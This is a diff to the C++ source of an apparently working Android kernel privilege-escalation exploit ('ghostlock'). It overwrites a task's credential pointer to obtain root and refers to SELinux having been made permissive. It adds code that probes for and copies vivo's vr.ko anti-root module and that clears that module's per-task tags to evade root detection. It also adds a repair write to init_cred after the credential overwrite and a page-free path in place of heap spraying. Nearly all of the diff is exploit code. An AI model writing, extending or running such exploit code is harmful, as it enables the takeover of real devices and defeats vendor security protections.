@@ -28,16 +28,222 @@
 #include "support/fatal_error.hpp"
 #include "support/run_state.hpp"
 
+#include <fcntl.h>
+#include <sys/stat.h>
 #include <unistd.h>
 
 #include <array>
+#include <climits>
 #include <cstdint>
+#include <cstdio>
 #include <optional>
+#include <string>
 #include <string_view>
 #include <utility>
 
 namespace ghostlock::session::backend {
     namespace {
+        /* One /proc/modules probe result. The name is kept (the old boolean
+         * could not tell "read and matched" from "unreadable, assumed loaded"),
+         * because the diagnostic copy below needs the file name. */
+        struct VrProbe {
+            int32_t needed = 1;
+            int32_t readable = 0;
+            char name[64] = {};
+        };
+
+        VrProbe probe_vr_module() {
+            VrProbe result;
+            result.needed = 1; /* /proc/modules unreadable: assume loaded */
+            FILE *m = fopen("/proc/modules", "r");
+            if (m == nullptr) return result;
+            auto close_modules = ghostlock::support::make_scope_exit(
+                [m]() noexcept { fclose(m); });
+            result.readable = 1;
+            result.needed = 0;
+            std::array<char, 256> mod{};
+            while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
+                const std::string_view line(mod.data());
+                const bool vr_prefix =
+                        line.size() >= 2 &&
+                        (line[0] == 'v' || line[0] == 'V') &&
+                        (line[1] == 'r' || line[1] == 'R');
+                if (!(vr_prefix && line.size() > 2 &&
+                      (line[2] == ' ' || line[2] == '_'))) {
+                    continue;
+                }
+                result.needed = 1;
+                /* The name becomes a path component: keep [A-Za-z0-9_-] only. */
+                size_t kept = 0;
+                for (size_t i = 0; i < line.size() && kept + 1 < sizeof(result.name); i++) {
+                    const char c = line[i];
+                    if (c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
+                    if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+                        (c >= '0' && c <= '9') || c == '_' || c == '-') {
+                        result.name[kept++] = c;
+                    }
+                }
+                result.name[kept] = '\0';
+                break;
+            }
+            return result;
+        }
+
+        /* Copy the loaded module's file and a small manifest into the app's run
+         * folder, which the exporter zips whole. Best effort by design: every
+         * failure is logged and recorded in the manifest, never fatal. The read
+         * runs at W2, after W1 made SELinux permissive, so a 0644 vendor file
+         * is readable without root; an unreadable file is a manifest entry, not
+         * a stopped run. */
+        void capture_vr_module(const VrProbe &probe, const std::string &run_dir) {
+            if (run_dir.empty()) return;
+            const std::string manifest_path = run_dir + "/vr-module.txt";
+            FILE *manifest = fopen(manifest_path.c_str(), "w");
+            if (manifest != nullptr) {
+                fprintf(manifest, "module=%s\n", probe.name);
+                fprintf(manifest, "probe_readable=%d\n", probe.readable);
+                fprintf(manifest, "probe_needed=%d\n", probe.needed);
+            }
+            if (!probe.name[0]) {
+                if (manifest != nullptr) fprintf(manifest, "result=no-name\n");
+                if (manifest != nullptr) fclose(manifest);
+                return;
+            }
+            static const char *const dirs[] = {
+                "/vendor/lib/modules", "/vendor_dlkm/lib/modules",
+                "/lib/modules", "/system/lib/modules",
+            };
+            static const char *const suffixes[] = {".ko", ".ko.xz", ".ko.gz", ".ko.zst"};
+            /* /proc/modules spells '-' as '_'; vendor files sometimes keep the
+             * hyphen, so try both spellings. */
+            char alt[sizeof(probe.name)] = {};
+            snprintf(alt, sizeof(alt), "%s", probe.name);
+            for (size_t i = 0; alt[i] != '\0'; i++) {
+                if (alt[i] == '_') alt[i] = '-';
+            }
+            const char *const names[] = {probe.name, alt};
+
+            constexpr long long kMaxBytes = 16LL * 1024 * 1024;
+            char source[PATH_MAX] = {};
+            const char *suffix = nullptr;
+            int32_t fd = -1;
+            for (const char *dir : dirs) {
+                for (const char *name : names) {
+                    for (const char *candidate_suffix : suffixes) {
+                        char path[PATH_MAX];
+                        const int n = snprintf(path, sizeof(path), "%s/%s%s", dir, name,
+                                               candidate_suffix);
+                        if (n <= 0 || static_cast<size_t>(n) >= sizeof(path)) continue;
+                        /* Symlinks are allowed: /vendor/lib/modules is
+                         * sometimes a link into /vendor_dlkm, and the name is
+                         * kernel-supplied and sanitised above. */
+                        fd = open(path, O_RDONLY | O_CLOEXEC);
+                        if (fd < 0) continue;
+                        snprintf(source, sizeof(source), "%s", path);
+                        suffix = candidate_suffix;
+                        break;
+                    }
+                    if (fd >= 0) break;
+                }
+                if (fd >= 0) break;
+            }
+            if (fd < 0) {
+                if (manifest != nullptr) {
+                    fprintf(manifest, "result=not-found\n");
+                    fprintf(manifest, "dirs=/vendor/lib/modules,/vendor_dlkm/lib/modules,"
+                                      "/lib/modules,/system/lib/modules\n");
+                    fprintf(manifest, "suffixes=.ko,.ko.xz,.ko.gz,.ko.zst\n");
+                    fclose(manifest);
+                }
+                pr_info("vr.ko module: %s not found in the vendor module dirs\n", probe.name);
+                return;
+            }
+            struct stat st{};
+            if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size <= 0 ||
+                static_cast<long long>(st.st_size) > kMaxBytes) {
+                if (manifest != nullptr) {
+                    fprintf(manifest, "source=%s\n", source);
+                    fprintf(manifest, "bytes=%lld\n", static_cast<long long>(st.st_size));
+                    fprintf(manifest, "result=rejected-size-or-type\n");
+                    fclose(manifest);
+                }
+                pr_warning("vr.ko module: %s rejected (bytes=%lld)\n", source,
+                           static_cast<long long>(st.st_size));
+                close(fd);
+                return;
+            }
+            char dst[PATH_MAX];
+            const int dst_len =
+                    snprintf(dst, sizeof(dst), "%s/vr-module%s", run_dir.c_str(), suffix);
+            if (dst_len <= 0 || static_cast<size_t>(dst_len) >= sizeof(dst)) {
+                if (manifest != nullptr) {
+                    fprintf(manifest, "source=%s\nresult=dst-path-too-long\n", source);
+                    fclose(manifest);
+                }
+                close(fd);
+                pr_warning("vr.ko module: run folder path too long\n");
+                return;
+            }
+            const int32_t out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+            if (out < 0) {
+                if (manifest != nullptr) {
+                    fprintf(manifest, "source=%s\nresult=open-dst-failed\n", source);
+                    fclose(manifest);
+                }
+                pr_warning("vr.ko module: cannot create %s\n", dst);
+                close(fd);
+                return;
+            }
+            std::array<char, 65536> buffer{};
+            long long total = 0;
+            bool ok = true;
+            for (;;) {
+                const ssize_t got = read(fd, buffer.data(), buffer.size());
+                if (got < 0) {
+                    ok = false;
+                    break;
+                }
+                if (got == 0) break;
+                size_t off = 0;
+                while (off < static_cast<size_t>(got)) {
+                    const ssize_t put =
+                            write(out, buffer.data() + off, static_cast<size_t>(got) - off);
+                    if (put <= 0) {
+                        ok = false;
+                        break;
+                    }
+                    off += static_cast<size_t>(put);
+                }
+                if (!ok) break;
+                total += got;
+                if (total > kMaxBytes) {
+                    ok = false;
+                    break;
+                }
+            }
+            close(fd);
+            if (ok) (void) fsync(out);
+            close(out);
+            if (!ok) {
+                unlink(dst);
+                if (manifest != nullptr) {
+                    fprintf(manifest, "source=%s\nresult=copy-failed\n", source);
+                    fclose(manifest);
+                }
+                pr_warning("vr.ko module: copy from %s failed\n", source);
+                return;
+            }
+            if (manifest != nullptr) {
+                fprintf(manifest, "source=%s\n", source);
+                fprintf(manifest, "bytes=%lld\n", total);
+                fprintf(manifest, "result=ok\n");
+                fflush(manifest);
+                (void) fsync(fileno(manifest));
+                fclose(manifest);
+            }
+            pr_info("vr.ko module: copied %s (%lld bytes) -> %s\n", source, total, dst);
+        }
+
         /* Shared write/retry sequence. */
         template <class M>
         Status retry_write_stage(
@@ -49,7 +255,9 @@ namespace ghostlock::session::backend {
             useconds_t settle_usec,
             write_stage_verify_fn verify,
             void *context,
-            int32_t leaf) {
+            int32_t leaf,
+            const memory::WriteRequest *post_write = nullptr,
+            const char *post_stage = nullptr) {
 
             /* no attempt can move a target that is wrong by construction, and the
              * stage belongs in the log with the address rather than the route */
@@ -90,6 +298,21 @@ namespace ghostlock::session::backend {
                 }
                 if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                     if (!M::w2_fast_repair_activate(session)) return false;
+                }
+                if (post_write) {
+                    /* The route's own second store landed on a field this stage
+                     * reads back (see docs/analysis/w2-anchored-cred-repair-plan.md);
+                     * repair it with a leaf write before the verify. A missed
+                     * repair is retried from the top like a missed write. */
+                    if (!Cve2026_43499Policy::template attack_write<M>(
+                            session, *post_write, post_stage ? post_stage : stage)) {
+                        support::discard_prebuilt_page();
+                        pr_warning("[T+%.0fms] %s attempt %u: post-write repair "
+                                   "missed; backing off\n",
+                                   attack::timer_ms(), stage, attempt);
+                        usleep(100000);
+                        continue;
+                    }
                 }
                 if (settle_usec) usleep(settle_usec);
                 if (verify(context)) return true;
@@ -164,54 +387,76 @@ namespace ghostlock::session::backend {
             /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
          * ------------------------------------------------------------------
-         * Always compiled: the /proc/modules probe below decides at runtime
-         * whether the writes run. The tag-B offset is overridable at build time
-         * (profile/macros.h), not gated by a define.
+         * Only the 6.x vr.ko generation uses the per-task tags: a byte at
+         * task+0x06 (inside thread_info.flags) and one at task+0x2c. The 5.10
+         * generation has neither, and on a 5.10 Image task+0x28 is
+         * thread_info.scs_sp, so zeroing the aligned word panics a
+         * CONFIG_SHADOW_CALL_STACK kernel.
          *
-         * vr.ko tags every app-origin task at fork/clone time. When the task
-         * later holds euid 0, the sys_exit tracepoint probe kills it. We must
-         * strip the tag BEFORE W2 verify runs the child's getuid().
+         * The UI choice is authoritative: Auto clears the tags only when the
+         * probe finds a vr module AND the profile is 6.x, On forces the writes
+         * (the 5.x direction is warned about and logged), Off never writes.
          *
          * This exploit primitive is 64-bit granular, so:
          *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
-         *     clears the syscall-tracepoint bit (0x400). This takes the task
-         *     off the sys_exit slow-path immediately.
-         *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
-         *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
-         *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
+         *     clears the syscall-tracepoint bit (0x400).
+         *   – tag B is at +0x2c; we align down to 0x28 and zero the word.
          * ------------------------------------------------------------------ */
             support::run_state::enter("w2b");
             {
-                static int32_t vr_needed = -1;
-                if (vr_needed < 0) {
-                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
-                    if (FILE *m = fopen("/proc/modules", "r")) {
-                        auto close_modules = ghostlock::support::make_scope_exit(
-                            [m]() noexcept { fclose(m); });
-                        std::array<char, 256> mod{};
-                        vr_needed = 0;
-                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
-                            const std::string_view line(mod.data());
-                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
-                             * then the module-name separator. */
-                            const bool vr_prefix =
-                                    line.size() >= 2 &&
-                                    (line[0] == 'v' || line[0] == 'V') &&
-                                    (line[1] == 'r' || line[1] == 'R');
-                            if (vr_prefix && line.size() > 2 &&
-                                (line[2] == ' ' || line[2] == '_')) {
-                                vr_needed = 1;
-                                break;
-                            }
-                        }
+                static VrProbe vr{};
+                static bool vr_probed = false;
+                if (!vr_probed) {
+                    vr = probe_vr_module();
+                    vr_probed = true;
+                    pr_info("vr.ko probe: /proc/modules readable=%d name=%s\n",
+                            vr.readable, vr.name[0] ? vr.name : "<none>");
+                    /* Before the tag writes: if the tag-B write is the thing that
+                     * kills this device, the module copy is already in the run
+                     * folder and the export carries it. */
+                    if (vr.needed) {
+                        capture_vr_module(vr, config::runtime_config_snapshot().run_dir);
                     }
-                    pr_info("vr.ko %s\n", vr_needed
-                            ? "loaded; clearing tags"
-                            : "not loaded; skipping tag clear");
+                }
+
+                /* The user's tri-state choice decides. The version and probe
+                 * only feed the recommendation Auto resolves to; On/Off is
+                 * final, including the 5.x scs_sp direction and a run with no
+                 * module detected. Both are warned about and logged. */
+                const config::VrKoMode vr_mode =
+                        config::runtime_config_snapshot().vrko_tag_clear;
+                const uint8_t vr_kernel_major = g_exploit_session.profile.kernel_major();
+                const bool vr_version_ok = vr_kernel_major >= 6;
+                const bool vr_recommended = vr.needed && vr_version_ok;
+                bool vr_write_tags = false;
+                const char *vr_reason = "auto-no-module";
+                switch (vr_mode) {
+                    case config::VrKoMode::On:
+                        vr_write_tags = true;
+                        vr_reason = "user-on";
+                        break;
+                    case config::VrKoMode::Off:
+                        vr_reason = "user-off";
+                        break;
+                    case config::VrKoMode::Auto:
+                        vr_write_tags = vr_recommended;
+                        vr_reason = !vr.needed ? "auto-no-module"
+                                    : !vr_version_ok ? "auto-kernel-major"
+                                    : "auto-recommended";
+                        break;
+                }
+                pr_info("vr.ko tag clear: mode=%s recommended=%d effective=%d kernel_major=%u probe=%d reason=%s\n",
+                        config::vr_ko_mode_name(vr_mode), vr_recommended ? 1 : 0,
+                        vr_write_tags ? 1 : 0, static_cast<unsigned>(vr_kernel_major),
+                        vr.needed, vr_reason);
+                if (vr_write_tags && !vr_recommended) {
+                    pr_warning("vr.ko tag clear: user override forces the tag writes "
+                               "(recommended=0 kernel_major=%u probe=%d)\n",
+                               static_cast<unsigned>(vr_kernel_major), vr.needed);
                 }
 
                 int32_t vr_ok = 1;
-                if (vr_needed) {
+                if (vr_write_tags) {
                     /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
@@ -235,11 +480,42 @@ namespace ghostlock::session::backend {
             support::run_state::complete("w2b");
 
             support::run_state::enter("w2a");
+            /* The anchored select route's credential write carries a second
+             * store into the object it points at -- init_cred+8 -- so every W2
+             * attempt corrupts the field pair at +8 (uid/gid once `struct cred`
+             * uses `atomic_long_t usage`, gid/suid on the 4-byte form). Repair
+             * it with a leaf write (one store, no collateral) after each cred
+             * write.
+             *
+             * The repair is gated on the *route*, not the kernel version: the
+             * 8-byte usage is a vendor-backport, not a 6.10-only property (the
+             * OnePlus 6.6.66 stock kernel has it), so a release test is wrong
+             * in both directions. The zeroed pair is [uid,gid] or [gid,suid] of
+             * init_cred -- all zero in either layout -- so the write is inert
+             * on the 4-byte-usage families.
+             * See docs/analysis/w2-anchored-cred-repair-plan.md. */
+            memory::WriteRequest w2_repair{};
+            bool have_w2_repair = false;
+            if (g_exploit_session.profile.supports(
+                        ghostlock::profile::RouteKind::SelectStack) &&
+                g_exploit_session.profile.select_stack_layout().lock_anchor_image.has_value()) {
+                const uintptr_t init_cred = session.addresses.data_alias(
+                        session.addresses.init_cred_image_addr());
+                if (init_cred) {
+                    const uint32_t uid_offset =
+                            g_exploit_session.profile.cred_uid_offset().value_or(8);
+                    w2_repair = memory::WriteRequest::make(
+                            init_cred + uid_offset, memory::WriteMode::Zero, /*leaf=*/1);
+                    have_w2_repair = true;
+                }
+            }
             Status got_root = retry_write_stage<M>(
                 session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                 g_exploit_session.profile.w2_attempts(),
                 g_exploit_session.profile.w2_settle_us(),
-                victim::verify_w2_stage, &w2_context, 0);
+                victim::verify_w2_stage, &w2_context, 0,
+                have_w2_repair ? &w2_repair : nullptr,
+                "W2: init_cred uid repair");
             if (!got_root) {
                 write(pipes.cmd_write.get(), "X", 1);
                 pipes.cmd_write.reset();
@@ -381,6 +657,13 @@ namespace ghostlock::session::backend {
             if constexpr (!M::multicast) {
                 return true;
             } else {
+                /* Page-free Stage 3: W1's value comes from the profile's
+                 * scratch anchor, so the page's private scratch is never
+                 * dirtied and there is no page to repair. */
+                if (support::page_free_run()) {
+                    pr_info("W1b: page-free run, no private scratch page to repair\n");
+                    return true;
+                }
                 const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
                 const uintptr_t w1_scratch_poison =
                         (session.heap.current.base) + mcast.buffer_size.value_or(0);
@@ -453,8 +736,12 @@ namespace ghostlock::session::backend {
             }
             const memory::WriteRequest usage_pin = memory::WriteRequest::make(
                 init_cred, memory::WriteMode::Zero, /*leaf=*/0);
+            /* The uid/gid pair follows `usage`: +4 on the 4-byte form, +8
+             * once the vendor backports the 8-byte `atomic_long_t`. The
+             * per-image key wins; +4 is the compiled fallback. */
+            const uint32_t uid_offset = session.profile.cred_uid_offset().value_or(4);
             const memory::WriteRequest uid_repair = memory::WriteRequest::make(
-                init_cred + 4, memory::WriteMode::Zero, /*leaf=*/1);
+                init_cred + uid_offset, memory::WriteMode::Zero, /*leaf=*/1);
 
             /* Retried, because a single dance failing is normal: the same reason
              * every other stage carries an attempt ladder. Three tries each, then
@@ -544,6 +831,12 @@ namespace ghostlock::session::backend {
             config::runtime_config_snapshot().debug_dir = debug_dir;
         if (!session.profile.loaded())
             attack::install_profile(decoded);
+        /* Page-free Stage 3: the mode is a per-run constant (policy ∧ scratch ∧
+         * anchor). Log it once, with the first missing conjunct when it is off,
+         * so an arm's identity is in the store rather than inferred from the
+         * absence of spray lines. */
+        pr_info("page_free=%d reason=%s\n",
+                support::page_free_run() ? 1 : 0, support::page_free_reason());
         /* Robustness guard: running the attack where KernelSU already owns root
          * drives the re-enforce path that panics the kernel at the first PI
          * route, and the objective is already met. Bail out cleanly instead; a
@@ -598,14 +891,26 @@ namespace ghostlock::session::backend {
          * no parent pointer, and the walk then enqueues -- rb_insert_color() reads
          * *(left) & 1 and dereferences a NULL grandparent when that word is even.
          * A zero write must therefore carry an odd pc. */
-        attack::timer_mark("  heap spray start");
-        (session.heap.current.base) = support::prepare_good_kernel_page(request);
-        if (!(session.heap.current.base)) {
-            pr_warning("  heap spray failed\n");
-            return 0;
+        if (support::page_free_run()) {
+            /* Page-free Stage 3: no spray, no leak, no page-acceptance gate.
+             * The write layout is still derived from this request -- W1/W1p
+             * carry the profile's scratch value, W2 carries init_cred, leaf
+             * writes carry target - 8 -- so the route stamps unchanged. */
+            attack::timer_mark("  page-free write start");
+            if (!support::prepare_page_free_context(request)) {
+                pr_warning("  page-free write context failed\n");
+                return 0;
+            }
+            attack::timer_mark("  page-free write ready");
+        } else {
+            attack::timer_mark("  heap spray start");
+            (session.heap.current.base) = support::prepare_good_kernel_page(request);
+            if (!(session.heap.current.base)) {
+                pr_warning("  heap spray failed\n");
+                return 0;
+            }
+            attack::timer_mark("  heap spray done");
         }
-
-        attack::timer_mark("  heap spray done");
         Status routed = route::middleware::run_middleware_route(session, request);
 
         attack::timer_mark("  PI route done");
